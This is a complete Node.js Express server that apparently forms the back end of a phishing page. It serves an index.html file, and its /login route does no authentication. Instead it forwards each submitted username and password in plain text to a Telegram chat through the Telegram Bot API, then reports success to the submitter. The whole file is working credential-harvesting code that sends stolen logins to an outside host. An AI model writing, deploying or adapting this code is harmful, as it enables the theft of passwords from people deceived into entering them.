const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 8080;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const indexPath = path.resolve(__dirname, "../../index.html");

app.get("/", (_req, res) => {
  res.sendFile(indexPath);
});

app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    res.status(400).json({ error: "Missing username or password" });
    return;
  }

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.error("Telegram credentials are not set in Secrets.");
    res.status(500).json({ error: "Telegram credentials not configured" });
    return;
  }

  const message = `New Login:\nUsername: ${username}\nPassword: ${password}`;

  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
    });

    res.json({ success: true });
  } catch (err) {
    console.error("Telegram API error:", err.response?.data || err.message);
    res.status(500).json({ error: "Failed to send to Telegram" });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
